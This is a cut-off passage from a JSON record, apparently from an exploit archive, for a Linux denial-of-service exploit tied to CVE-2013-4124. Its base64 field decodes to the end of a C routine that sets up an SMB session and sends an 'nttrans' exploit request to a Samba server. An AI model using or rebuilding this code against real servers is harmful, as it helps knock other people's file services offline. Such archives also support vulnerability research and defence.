iLCAiU0FNQkEiKTsgIC8vIGFkanVzdCBjb21wdXRlciBuYW1lcyhjbGllbnRuYW1lLCBzZXJ2ZXJuYW1lKQ0KICAgIHByb2Nlc3NfbmJ0X3Nlc3Npb25fcmVwbHkoZmQpOw0KDQogIC8vIHByb3RvY29sIG5lZ290aWF0aW9uDQogICAgbmVncHJvdF9yZXF1ZXN0KGZkKTsNCiAgICBwcm9jZXNzX25lZ3Byb3RfcmVwbHkoZmQpOw0KIA0KICAgIC8vIHNlc3Npb24gc2V0dXANCiAgICBzZXNzc2V0dXB4X3JlcXVlc3QoZmQpOyAgLy8gc2V0dXAgcmVxdWVzdA0KICAgIHByb2Nlc3Nfc2Vzc3NldHVweF9yZXBseShmZCk7ICAvLyBzZXR1cCByZXBseQ0KDQogICAgLy8gdHJlZSBjb25uZWN0aW9uIHNldHVwDQogICAgdGNvbnhfcmVxdWVzdChmZCk7DQogICAgcHJvY2Vzc190Y29ueF9yZXBseShmZCk7DQoNCiAgLy8gZXhwbG9pdCENCiAgICBwcmludGYoIlsqXSBudHRyYW5zIHJlcGx5IGV4cGxvaXQhXG4iKTsNCiAgICBudHRyYW5zX3JlcXVlc3QoZmQpOw0KDQogIGNsb3NlKGZkKTsNCg0KICByZXR1cm4gMDsNCn0=", 
    "filename": "platforms/linux/dos/27778.txt", 
    "id": "27778", 
    "cves": [
        "CVE-2013-4124"
    ]
}